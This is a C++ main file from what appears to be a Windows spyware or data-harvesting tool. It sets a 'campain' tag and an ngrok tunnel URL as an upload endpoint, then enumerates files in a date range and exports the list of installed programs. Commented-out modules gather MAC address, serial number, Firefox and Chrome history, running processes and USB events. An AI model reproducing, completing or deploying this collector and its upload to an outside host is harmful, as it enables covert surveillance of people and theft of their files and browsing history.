#define _CRT_SECURE_NO_WARNINGS

#include<iostream>

#include <thread>
#include <mutex>

#include "system.h"
#include "network.h"
#include "computer.h"

#include "usbMon.h"

#include "firefoxUrl.h"

#include "chromeUrl.h"

#include "softwareInstall.h"

#include "processList.h"

using namespace std;

_CONFIG config;
_LIST_FILE_INFO listFile;
_FILE_INFO fileInfor;

_COMPUTER_INFO PC;

string hostName;
string campain;

string rootFolder;
string startDate, endDate;

int countFiles;


int main()
{
	//List file================================================================================
	hostName   = "https://9171-2a09-bac5-d458-16c8-00-245-71.ngrok-free.app/upload";
	campain    = "cam87";
	startDate  = "2017_04_05";
	endDate    = "2024_04_05";
	rootFolder = "F:\DATA_X12DVY5M"; 
	config.LastModifyFile = "";

	listFile = GetListFile(rootFolder, config.LastModifyFile, startDate, endDate);
	countFiles = listFile.count;

	cout << "fileNumber: " << countFiles << "............" << endl;
	for (int i = 1; i <= countFiles; i++)
	{
		cout << "FileName: " << listFile.arr[i].FileName << "   "  << listFile.arr[i].LastModify << endl;
	}

	//Computer Infor==========================================================================
	//PC = getComputerInfor();
	//cout << "Computer Name: " << PC.computerName << endl;
	//cout << "MAC Address: "   << PC.macAddress   << endl;
	//cout << "Serial Number: " << PC.serialNumber << endl;
	//cout << "OS: "            << PC.OS           << endl;
	//cout << "Manufacturer: "  << PC.manufacturer << endl;
	//cout << "Model: "         << PC.model        << endl;

	//Url Firefox==============================================================================
	//const char* firefoxProfilePath = "C:\\Users\\HuynhDuc\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qn2bivag.default-release";
	//collectFirefoxHistory();
	
	//Url Chrome==============================================================================
	//processChromeHistory();

	//Software Install========================================================================
	//EnumerateVideoAudioPlayers();

	std::string fileName = "installed_programs.txt";
	ExportInstalledProgramsToFile(fileName);
	
	//========================================================================================
	//EnumerateRunningProcesses();

	//USB detect==============================================================================
	/*DeviceNotification deviceNotification;
	deviceNotification.run_from_thread();*/


	//////////////////////////////////////////////////////////////////
	//DeviceNotification deviceNotification;

	// Tạo một đối tượng luồng và chạy phương thức run()
	//USBThread notificationThread(deviceNotification);
	//notificationThread.run();

	// Đợi luồng kết thúc trước khi thoát
	//notificationThread.join();
	//////////////////////////////////////////////////////////////////

	return 0;
}
